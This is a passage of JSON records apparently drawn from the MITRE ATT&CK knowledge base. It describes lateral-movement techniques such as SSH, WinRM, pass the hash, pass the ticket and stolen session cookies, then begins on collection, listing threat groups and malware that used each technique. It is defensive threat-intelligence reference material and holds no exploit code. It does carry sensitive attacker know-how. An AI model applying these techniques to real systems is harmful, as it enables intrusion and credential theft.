"SSH", "description": "Adversaries may use Valid Accounts to log into remote machines using Secure Shell (SSH). The adversary may then perform actions as the logged-on user.", "detailed_description": "Adversaries may use Valid Accounts to log into remote machines using Secure Shell (SSH). The adversary may then perform actions as the logged-on user.\nSSH is a protocol that allows authorized users to open remote shells on other computers. Many Linux and macOS versions come with SSH installed by default, although typically disabled until the user enables it. The SSH server can be configured to use standard password authentication or public-private keypairs in lieu of or in addition to a password. In this authentication scenario, the user\u2019s public key must be in a special file on the computer running the server that lists which keypairs are allowed to login as that user.", "id": "T1021.004", "examples": [{"id": "G0087", "name": "APT39", "description": "APT39 used secure shell (SSH) to move laterally among their targets."}, {"id": "G1023", "name": "APT5", "description": "APT5 has used SSH for lateral movement in compromised environments including for enabling access to ESXi host servers."}, {"id": "G0143", "name": "Aquatic Panda", "description": "Aquatic Panda used SSH with captured user credentials to move laterally in victim environments."}, {"id": "G0098", "name": "BlackTech", "description": "BlackTech has used Putty for remote access."}, {"id": "C0032", "name": "C0032", "description": "During the C0032 campaign, TEMP.Veles relied on encrypted SSH-based tunnels to transfer tools and for remote command/program execution."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can SSH to a remote service."}, {"id": "C0029", "name": "Cutting Edge", "description": "During Cutting Edge, threat actors used SSH for lateral movement."}, {"id": "S0363", "name": "Empire", "description": "Empire contains modules for executing commands over SSH as well as in-memory VNC agent injection."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has remotely accessed compromised environments via secure shell (SSH) for lateral movement."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 has used SSH to move laterally through victim environments."}, {"id": "G0117", "name": "Fox Kitten", "description": "Fox Kitten has used the PuTTY and Plink tools for lateral movement."}, {"id": "G0036", "name": "GCMAN", "description": "GCMAN uses Putty for lateral movement."}, {"id": "G0119", "name": "Indrik Spider", "description": "Indrik Spider has used SSH for lateral movement."}, {"id": "S0599", "name": "Kinsing", "description": "Kinsing has used SSH for lateral movement."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group used SSH and the PuTTy PSCP utility to gain access to a restricted segment of a compromised network."}, {"id": "G0065", "name": "Leviathan", "description": "Leviathan used ssh for internal reconnaissance."}, {"id": "G0045", "name": "menuPass", "description": "menuPass has used Putty Secure Copy Client (PSCP) to transfer data."}, {"id": "G0049", "name": "OilRig", "description": "OilRig has used Putty to access compromised systems."}, {"id": "G0106", "name": "Rocke", "description": "Rocke has spread its coinminer via SSH."}, {"id": "G0139", "name": "TeamTNT", "description": "TeamTNT has used SSH to connect back to victim machines. TeamTNT has also used SSH to transfer tools and payloads onto victim hosts and execute them."}]}, {"name": "VNC", "description": "Adversaries may use Valid Accounts to remotely control machines using Virtual Network Computing (VNC).  VNC is a platform-independent desktop sharing system that uses the RFB (\"remote framebuffer\") protocol to enable users to remotely control another computer\u2019s display by relaying the screen, mouse, and keyboard inputs over the network.", "detailed_description": "Adversaries may use Valid Accounts to remotely control machines using Virtual Network Computing (VNC).  VNC is a platform-independent desktop sharing system that uses the RFB (\"remote framebuffer\") protocol to enable users to remotely control another computer\u2019s display by relaying the screen, mouse, and keyboard inputs over the network.\nVNC differs from Remote Desktop Protocol as VNC is screen-sharing software rather than resource-sharing software. By default, VNC uses the system's authentication, but it can be configured to use credentials specific to VNC.\nAdversaries may abuse VNC to perform malicious actions as the logged-on user such as opening documents, downloading files, and running arbitrary commands. An adversary could use VNC to remotely control and monitor a system to collect data and information to pivot to other systems within the network. Specific VNC libraries/implementations have also been susceptible to brute force attacks and memory usage exploitation.", "id": "T1021.005", "examples": [{"id": "S0484", "name": "Carberp", "description": "Carberp can start a remote VNC session by downloading a new plugin."}, {"id": "S1014", "name": "DanBot", "description": "DanBot can use VNC for remote access to targeted systems."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 has used TightVNC to control compromised hosts."}, {"id": "G0117", "name": "Fox Kitten", "description": "Fox Kitten has installed TightVNC server and client on compromised servers and endpoints for lateral movement."}, {"id": "G0047", "name": "Gamaredon Group", "description": "Gamaredon Group has used VNC tools, including UltraVNC, to remotely interact with compromised hosts."}, {"id": "G0036", "name": "GCMAN", "description": "GCMAN uses VNC for lateral movement."}, {"id": "S1160", "name": "Latrodectus", "description": "Latrodectus has routed C2 traffic using Keyhole VNC."}, {"id": "S0279", "name": "Proton", "description": "Proton uses VNC to connect into systems."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot has used a VNC module to monitor the victim and collect information to pivot to valuable systems on the network "}, {"id": "S0670", "name": "WarzoneRAT", "description": "WarzoneRAT has the ability of performing remote desktop access via a VNC console."}, {"id": "S0412", "name": "ZxShell", "description": "ZxShell supports functionality for VNC sessions."}]}, {"name": "Windows Remote Management", "description": "Adversaries may use Valid Accounts to interact with remote systems using Windows Remote Management (WinRM). The adversary may then perform actions as the logged-on user.", "detailed_description": "Adversaries may use Valid Accounts to interact with remote systems using Windows Remote Management (WinRM). The adversary may then perform actions as the logged-on user.\nWinRM is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services). It may be called with the winrm command or by any number of programs such as PowerShell. WinRM  can be used as a method of remotely interacting with Windows Management Instrumentation.", "id": "T1021.006", "examples": [{"id": "S1063", "name": "Brute Ratel C4", "description": "Brute Ratel C4 can use WinRM for pivoting."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has used WinRM for lateral movement."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can use WinRM to execute a payload on a remote host."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has leveraged WMI to move laterally within a compromised network via application servers and SQL servers."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY tracks TrustedHosts and can move laterally to these targets via WinRM."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 used WinRM via PowerShell to execute commands and payloads on remote hosts."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390 has used WinRM to enable remote execution."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has used Window Remote Management to move laterally through a victim network."}]}, {"name": "Cloud Services", "description": "Adversaries may log into accessible cloud services within a compromised environment using Valid Accounts that are synchronized with or federated to on-premises user identities. The adversary may then perform management actions or access cloud-hosted resources as the logged-on user.", "detailed_description": "Adversaries may log into accessible cloud services within a compromised environment using Valid Accounts that are synchronized with or federated to on-premises user identities. The adversary may then perform management actions or access cloud-hosted resources as the logged-on user.\nMany enterprises federate centrally managed user identities to cloud services, allowing users to login with their domain credentials in order to access the cloud control plane. Similarly, adversaries may connect to available cloud services through the web console or through the cloud command line interface (CLI) (e.g., Cloud API), using commands such as Connect-AZAccount for Azure PowerShell, Connect-MgGraph for Microsoft Graph PowerShell, and gcloud auth login for the Google Cloud CLI.\nIn some cases, adversaries may be able to authenticate to these services via Application Access Token instead of a username and password.", "id": "T1021.007", "examples": [{"id": "G0016", "name": "APT29", "description": "APT29 has leveraged compromised high-privileged on-premises accounts synced to Office 365 to move laterally into a cloud environment, including through the use of Azure AD PowerShell."}, {"id": "C0027", "name": "C0027", "description": "During C0027, Scattered Spider used compromised Azure credentials for credential theft activity and lateral movement to on-premises systems."}, {"id": "G1015", "name": "Scattered Spider", "description": "During C0027, Scattered Spider used compromised Azure credentials for credential theft activity and lateral movement to on-premises systems.Scattered Spider has also leveraged pre-existing AWS EC2 instances for lateral movement and data collection purposes."}]}, {"name": "Direct Cloud VM Connections", "description": "Adversaries may leverage Valid Accounts to log directly into accessible cloud hosted compute infrastructure through cloud native methods. Many cloud providers offer interactive connections to virtual infrastructure that can be accessed through the Cloud API, such as Azure Serial Console, AWS EC2 Instance Connect, and AWS System Manager..", "detailed_description": "Adversaries may leverage Valid Accounts to log directly into accessible cloud hosted compute infrastructure through cloud native methods. Many cloud providers offer interactive connections to virtual infrastructure that can be accessed through the Cloud API, such as Azure Serial Console, AWS EC2 Instance Connect, and AWS System Manager..\nMethods of authentication for these connections can include passwords, application access tokens, or SSH keys. These cloud native methods may, by default, allow for privileged access on the host with SYSTEM or root level access.\nAdversaries may utilize these cloud native methods to directly access virtual infrastructure and pivot through an environment. These connections typically provide direct console access to the VM rather than the execution of scripts (i.e., Cloud Administration Command).", "id": "T1021.008", "examples": []}]}, {"name": "Replication Through Removable Media", "description": "Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself.", "detailed_description": "Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself.\nMobile devices may also be used to infect PCs with malware if connected via USB. This infection may be achieved using devices (Android, iOS, etc.) and, in some instances, USB charging cables. For example, when a smartphone is connected to a system, it may appear to be mounted similar to a USB-connected disk drive. If malware that is compatible with the connected system is on the mobile device, the malware could infect the machine (especially if Autorun features are enabled).", "id": "T1091", "examples": [{"id": "S0092", "name": "Agent.btz", "description": "Agent.btz drops itself onto removable media devices and creates an autorun.inf file with an instruction to run that file. When the device is inserted into another system, it opens autorun.inf and loads the malware."}, {"id": "S1074", "name": "ANDROMEDA", "description": "ANDROMEDA has been spread via infected USB keys."}, {"id": "G1007", "name": "Aoqin Dragon", "description": "Aoqin Dragon has used a dropper that employs a worm infection strategy using a removable device to breach a secure network environment."}, {"id": "G0007", "name": "APT28", "description": "APT28 uses a tool to infect connected USB devices and transmit itself to air-gapped computers when the infected USB device is inserted."}, {"id": "S0023", "name": "CHOPSTICK", "description": "Part of APT28's operation involved using CHOPSTICK modules to copy itself to air-gapped machines and using files written to USB sticks to transfer data and command traffic."}, {"id": "S0608", "name": "Conficker", "description": "Conficker variants used the Windows AUTORUN feature to spread through USB propagation."}, {"id": "S0115", "name": "Crimson", "description": "Crimson can spread across systems by infecting removable media."}, {"id": "G0012", "name": "Darkhotel", "description": "Darkhotel's selective infector modifies executables stored on removable media as a method of spreading across computers."}, {"id": "S0062", "name": "DustySky", "description": "DustySky searches for removable media and duplicates itself onto it."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 actors have mailed USB drives to potential victims containing malware that downloads and installs various backdoors, including in some cases for ransomware operations."}, {"id": "S0143", "name": "Flame", "description": "Flame contains modules to infect USB sticks and spread laterally to other Windows systems the stick is plugged into using Autorun functionality."}, {"id": "S0132", "name": "H1N1", "description": "H1N1 has functionality to copy itself to removable media."}, {"id": "G1014", "name": "LuminousMoth", "description": "LuminousMoth has used malicious DLLs to spread malware to connected removable USB drives on infected machines."}, {"id": "G0129", "name": "Mustang Panda", "description": "Mustang Panda has used a customized PlugX variant which could spread through USB connections."}, {"id": "S0385", "name": "njRAT", "description": "njRAT can be configured to spread via removable drives."}, {"id": "S0650", "name": "QakBot", "description": "QakBot has the ability to use removable drives to spread through compromised networks."}, {"id": "S0458", "name": "Ramsay", "description": "Ramsay can spread itself by infecting other portable executable files on removable drives."}, {"id": "S1130", "name": "Raspberry Robin", "description": "Raspberry Robin has historically used infected USB media to spread to new victims."}, {"id": "S0028", "name": "SHIPSHAPE", "description": "APT30 may have used the SHIPSHAPE malware to move onto air-gapped networks. SHIPSHAPE targets removable drives to spread to other systems by modifying the drive to use Autorun to execute or by hiding legitimate document files and copying an executable to the folder with the same name as the legitimate document."}, {"id": "S0603", "name": "Stuxnet", "description": "Stuxnet can propagate via removable media using an autorun.inf file or the CVE-2010-2568 LNK vulnerability."}, {"id": "G0081", "name": "Tropic Trooper", "description": "Tropic Trooper has attempted to transfer USBferry from an infected USB device by copying an Autorun function to the target machine."}, {"id": "S0130", "name": "Unknown Logger", "description": "Unknown Logger is capable of spreading to USB devices."}, {"id": "S0386", "name": "Ursnif", "description": "Ursnif has copied itself to and infected removable drives for propagation."}, {"id": "S0452", "name": "USBferry", "description": "USBferry can copy its installer to attached USB storage devices."}, {"id": "S0136", "name": "USBStealer", "description": "USBStealer drops itself onto removable media and relies on Autorun to execute the malicious file when a user opens the removable media on another system."}], "sub_techniques": []}, {"name": "Software Deployment Tools", "description": "Adversaries may gain access to and use centralized software suites installed within an enterprise to execute commands and move laterally through the network. Configuration management and software deployment applications may be used in an enterprise network or cloud environment for routine administration purposes. These systems may also be integrated into CI/CD pipelines. Examples of such solutions include: SCCM, HBSS, Altiris, AWS Systems Manager, Microsoft Intune, Azure Arc, and GCP Deployment Manager.", "detailed_description": "Adversaries may gain access to and use centralized software suites installed within an enterprise to execute commands and move laterally through the network. Configuration management and software deployment applications may be used in an enterprise network or cloud environment for routine administration purposes. These systems may also be integrated into CI/CD pipelines. Examples of such solutions include: SCCM, HBSS, Altiris, AWS Systems Manager, Microsoft Intune, Azure Arc, and GCP Deployment Manager.\nAccess to network-wide or enterprise-wide endpoint management software may enable an adversary to achieve remote code execution on all connected systems. The access may be used to laterally move to other systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.\nSaaS-based configuration management services may allow for broad Cloud Administration Command on cloud-hosted instances, as well as the execution of arbitrary commands on on-premises endpoints. For example, Microsoft Configuration Manager allows Global or Intune Administrators to run scripts as SYSTEM on on-premises devices joined to Entra ID. Such services may also utilize Web Protocols to communicate back to adversary owned infrastructure.\nNetwork infrastructure devices may also have configuration management tools that can be similarly abused by adversaries.\nThe permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the third-party system, or specific domain credentials may be required. However, the system may require an administrative account to log in or to access specific functionality.", "id": "T1072", "examples": [{"id": "G0050", "name": "APT32", "description": "APT32 compromised McAfee ePO to move laterally by distributing malware as a software deployment task."}, {"id": "C0018", "name": "C0018", "description": "During C0018, the threat actors used PDQ Deploy to move AvosLocker and tools across the network."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team has used the commercially available tool RemoteExec for agentless remote code execution."}, {"id": "G0091", "name": "Silence", "description": "Silence has used RAdmin, a remote software tool used to remotely control workstations and ATMs."}, {"id": "G0028", "name": "Threat Group-1314", "description": "Threat Group-1314 actors used a victim's endpoint management platform, Altiris, for lateral movement."}, {"id": "S0041", "name": "Wiper", "description": "It is believed that a patch management system for an anti-virus product commonly installed among targeted companies was used to distribute the Wiper malware."}], "sub_techniques": []}, {"name": "Taint Shared Content", "description": "Adversaries may deliver payloads to remote systems by adding content to shared storage locations, such as network drives or internal code repositories. Content stored on network drives or in other shared locations may be tainted by adding malicious programs, scripts, or exploit code to otherwise valid files. Once a user opens the shared tainted content, the malicious portion can be executed to run the adversary's code on a remote system. Adversaries may use tainted shared content to move laterally.", "detailed_description": "Adversaries may deliver payloads to remote systems by adding content to shared storage locations, such as network drives or internal code repositories. Content stored on network drives or in other shared locations may be tainted by adding malicious programs, scripts, or exploit code to otherwise valid files. Once a user opens the shared tainted content, the malicious portion can be executed to run the adversary's code on a remote system. Adversaries may use tainted shared content to move laterally.\nA directory share pivot is a variation on this technique that uses several other techniques to propagate malware when users access a shared network directory. It uses Shortcut Modification of directory .LNK files that use Masquerading to look like the real directories, which are hidden through Hidden Files and Directories. The malicious .LNK-based directories have an embedded command that executes the hidden malware file in the directory and then opens the real intended directory so that the user's expected action still occurs. When used with frequently used network directories, the technique may result in frequent reinfections and broad access to systems and potentially to new and higher privileged accounts.\nAdversaries may also compromise shared network directories through binary infections by appending or prepending its code to the healthy binary on the shared network directory. The malware may modify the original entry point (OEP) of the healthy binary to ensure that it is executed before the legitimate code. The infection could continue to spread via the newly infected file when it is executed by a remote system. These infections may target both binary and non-binary formats that end with extensions including, but not limited to, .EXE, .DLL, .SCR, .BAT, and/or .VBS.", "id": "T1080", "examples": [{"id": "G0060", "name": "BRONZE BUTLER", "description": "BRONZE BUTLER has placed malware on file shares and given it the same name as legitimate documents on the share."}, {"id": "G1021", "name": "Cinnamon Tempest", "description": "Cinnamon Tempest has deployed ransomware from a batch file in a network share."}, {"id": "S0575", "name": "Conti", "description": "Conti can spread itself by infecting other remote machines via network shared drives."}, {"id": "G0012", "name": "Darkhotel", "description": "Darkhotel used a virus that propagates by infecting executables stored on shared drives."}, {"id": "G0047", "name": "Gamaredon Group", "description": "Gamaredon Group has injected malicious macros into all Word and Excel documents on mapped network drives."}, {"id": "S0132", "name": "H1N1", "description": "H1N1 has functionality to copy itself to network shares."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole can replace legitimate software or documents in the compromised network with their trojanized versions, in an attempt to propagate itself within the network."}, {"id": "S0133", "name": "Miner-C", "description": "Miner-C copies itself into the public folder of Network Attached Storage (NAS) devices and infects new victims who open the file."}, {"id": "S0458", "name": "Ramsay", "description": "Ramsay can spread itself by infecting other portable executable files on networks shared drives."}, {"id": "G1039", "name": "RedCurl", "description": "RedCurl has placed modified LNK files on network drives for lateral movement."}, {"id": "S0603", "name": "Stuxnet", "description": "Stuxnet infects remote servers via network shares and by infecting WinCC database views with malicious code."}, {"id": "S0386", "name": "Ursnif", "description": "Ursnif has copied itself to and infected files in network drives for propagation."}], "sub_techniques": []}, {"name": "Use Alternate Authentication Material", "description": "Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls.", "detailed_description": "Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls.\nAuthentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.\nCaching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system\u2014either in memory or on disk\u2014it may be at risk of being stolen through Credential Access techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.", "id": "T1550", "examples": [{"id": "S0661", "name": "FoggyWeb", "description": "FoggyWeb can allow abuse of a compromised AD FS server's SAML token."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 used forged SAML tokens that allowed the actors to impersonate users and bypass MFA, enabling APT29 to access enterprise cloud applications and services."}], "sub_techniques": [{"name": "Application Access Token", "description": "Adversaries may use stolen application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users or services and used in lieu of login credentials.", "detailed_description": "Adversaries may use stolen application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users or services and used in lieu of login credentials.\nApplication access tokens are used to make authorized API requests on behalf of a user or service and are commonly used to access resources in cloud, container-based applications, and software-as-a-service (SaaS).\nOAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.\nFor example, with a cloud-based email service, once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a \"refresh\" token enabling background access is awarded. With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.\nCompromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim\u2019s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. In AWS and GCP environments, adversaries can trigger a request for a short-lived access token with the privileges of another user account. The adversary can then use this token to request data or perform actions the original account could not. If permissions for this feature are misconfigured \u2013 for example, by allowing all users to request a token for a particular account - an adversary may be able to gain initial access to a Cloud Account or escalate their privileges.\nDirect API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords.  For example, in AWS environments, an adversary who compromises a user\u2019s AWS API credentials may be able to use the sts:GetFederationToken API call to create a federated user session, which will have the same permissions as the original user but may persist even if the original user credentials are deactivated. Additionally, access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.", "id": "T1550.001", "examples": [{"id": "G0007", "name": "APT28", "description": "APT28 has used several malicious applications that abused OAuth access tokens to gain access to target email accounts, including Gmail and Yahoo Mail."}, {"id": "S1023", "name": "CreepyDrive", "description": "CreepyDrive can use legitimate OAuth refresh tokens to authenticate with OneDrive."}, {"id": "S0683", "name": "Peirates", "description": "Peirates can use stolen service account tokens to perform its operations. It also enables adversaries to switch between valid service accounts."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 used compromised service principals to make changes to the Office 365 environment."}]}, {"name": "Pass the Hash", "description": "Adversaries may \"pass the hash\" using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.", "detailed_description": "Adversaries may \"pass the hash\" using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.\nWhen performing PtH, valid password hashes for the account being used are captured using a Credential Access technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.\nAdversaries may also use stolen password hashes to \"overpass the hash.\" Similar to PtH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket. This ticket can then be used to perform Pass the Ticket attacks.", "id": "T1550.002", "examples": [{"id": "G0006", "name": "APT1", "description": "The APT1 group is known to have used pass the hash."}, {"id": "G0007", "name": "APT28", "description": "APT28 has used pass the hash for lateral movement."}, {"id": "G0050", "name": "APT32", "description": "APT32 has used pass the hash for lateral movement."}, {"id": "G0096", "name": "APT41", "description": "APT41 uses tools such as Mimikatz to enable lateral movement via captured password hashes."}, {"id": "G0143", "name": "Aquatic Panda", "description": "Aquatic Panda used a registry edit to enable a Windows feature called RestrictedAdmin in victim environments. This change allowed Aquatic Panda to leverage \"pass the hash\" mechanisms as the alteration allows for RDP connections with a valid account name and hash only, without possessing a cleartext password value."}, {"id": "S1081", "name": "BADHATCH", "description": "BADHATCH can perform pass the hash on compromised machines with x64 versions."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has dumped password hashes for use in pass the hash authentication attacks."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can perform pass the hash."}, {"id": "S0488", "name": "CrackMapExec", "description": "CrackMapExec can pass the hash to authenticate via SMB."}, {"id": "G1003", "name": "Ember Bear", "description": "Ember Bear has used pass-the-hash techniques for lateral movement in victim environments."}, {"id": "S0363", "name": "Empire", "description": "Empire can perform pass the hash attacks."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has used the PowerShell utility Invoke-SMBExec to execute the pass the hash method for lateral movement within an compromised environment."}, {"id": "G0093", "name": "GALLIUM", "description": "GALLIUM used dumped hashes to authenticate to other machines via pass the hash."}, {"id": "S0376", "name": "HOPLIGHT", "description": "HOPLIGHT has been observed loading several APIs associated with Pass the Hash."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has used pass the hash for authentication to remote access software used in C2."}, {"id": "S0002", "name": "Mimikatz", "description": "Mimikatz's SEKURLSA::Pth module can impersonate a user, with only a password hash, to execute arbitrary commands."}, {"id": "C0002", "name": "Night Dragon", "description": "During Night Dragon, threat actors used pass-the-hash tools to obtain authenticated access to sensitive internal desktops and servers."}, {"id": "S0122", "name": "Pass-The-Hash Toolkit", "description": "Pass-The-Hash Toolkit can perform pass the hash."}, {"id": "S0378", "name": "PoshC2", "description": "PoshC2 has a number of modules that leverage pass the hash for lateral movement."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has used the Invoke-SMBExec PowerShell cmdlet to execute the pass-the-hash technique and utilized stolen password hashes to move laterally."}]}, {"name": "Pass the Ticket", "description": "Adversaries may \"pass the ticket\" using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.", "detailed_description": "Adversaries may \"pass the ticket\" using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.\nWhen preforming PtT, valid Kerberos tickets for Valid Accounts are captured by OS Credential Dumping. A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access.\nA Silver Ticket can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint).\nA Golden Ticket can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.\nAdversaries may also create a valid Kerberos ticket using other user information, such as stolen password hashes or AES keys. For example, \"overpassing the hash\" involves using a NTLM password hash to authenticate as a user (i.e. Pass the Hash) while also using the password hash to create a valid Kerberos ticket.", "id": "T1550.003", "examples": [{"id": "G0016", "name": "APT29", "description": "APT29 used Kerberos ticket attacks for lateral movement."}, {"id": "G0050", "name": "APT32", "description": "APT32 successfully gained remote access by using pass the ticket."}, {"id": "G0060", "name": "BRONZE BUTLER", "description": "BRONZE BUTLER has created forged Kerberos Ticket Granting Ticket (TGT) and Ticket Granting Service (TGS) tickets to maintain administrative access."}, {"id": "S0002", "name": "Mimikatz", "description": "Mimikatz\u2019s LSADUMP::DCSync and KERBEROS::PTT modules implement the three steps required to extract the krbtgt account hash and create/use Kerberos tickets."}, {"id": "S0192", "name": "Pupy", "description": "Pupy can also perform pass-the-ticket."}, {"id": "S0053", "name": "SeaDuke", "description": "Some SeaDuke samples have a module to use pass the ticket with Kerberos for authentication."}]}, {"name": "Web Session Cookie", "description": "Adversaries can use stolen session cookies to authenticate to web applications and services. This technique bypasses some multi-factor authentication protocols since the session is already authenticated.", "detailed_description": "Adversaries can use stolen session cookies to authenticate to web applications and services. This technique bypasses some multi-factor authentication protocols since the session is already authenticated.\nAuthentication cookies are commonly used in web applications, including cloud-based services, after a user has authenticated to the service so credentials are not passed and re-authentication does not need to occur as frequently. Cookies are often valid for an extended period of time, even if the web application is not actively used. After the cookie is obtained through Steal Web Session Cookie or Web Cookies, the adversary may then import the cookie into a browser they control and is then able to use the site or application as the user for as long as the session cookie is active. Once logged into the site, an adversary can access sensitive information, read email, or perform actions that the victim account has permissions to perform.\nThere have been examples of malware targeting session cookies to bypass multi-factor authentication systems.", "id": "T1550.004", "examples": [{"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 used stolen cookies to access cloud resources and a forged duo-sid cookie to bypass MFA set on an email account."}, {"id": "G1033", "name": "Star Blizzard", "description": "Star Blizzard has bypassed multi-factor authentication on victim email accounts by using session cookies stolen using EvilGinx."}]}]}]}, {"name": "Collection", "description": "The adversary is trying to gather data of interest to their goal.Collection consists of techniques adversaries may use to gather information and the sources information is collected from that are relevant to following through on the adversary's objectives. Frequently, the next goal after collecting data is to either steal (exfiltrate) the data or to use the data to gain more information about the target environment. Common target sources include various drive types, browsers, audio, video, and email. Common collection methods include capturing screenshots and keyboard input.", "id": "TA0009", "techniques": [{"name": "Adversary-in-the-Middle", "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as Network Sniffing, Transmitted Data Manipulation, or replay attacks (Exploitation for Credential Access). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.", "detailed_description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as Network Sniffing, Transmitted Data Manipulation, or replay attacks (Exploitation for Credential Access). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware. Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens (Steal Application Access Token) and session cookies (Steal Web Session Cookie). Downgrade Attacks can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in Transmitted Data Manipulation. Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to Impair Defenses and/or in support of a Network Denial of Service.", "id": "T1557", "examples": [{"id": "S0281", "name": "Dok", "description": "Dok proxies web traffic to potentially monitor and alter victim HTTP(S) traffic."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has used modified versions of PHProxy to examine web traffic between the victim and the accessed website."}, {"id": "S1131", "name": "NPPSPY", "description": "NPPSPY opens a new network listener for the mpnotify.exe process that is typically contacted by the Winlogon process in Windows. A new, alternative RPC channel is set up with a malicious DLL recording plaintext credentials entered into Winlogon, effectively intercepting and redirecting the logon information."}], "sub_techniques": [{"name": "LLMNR/NBT-NS Poisoning and SMB Relay", "description": "By responding to LLMNR/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system. This activity may be used to collect or relay authentication materials.", "detailed_description": "By responding to 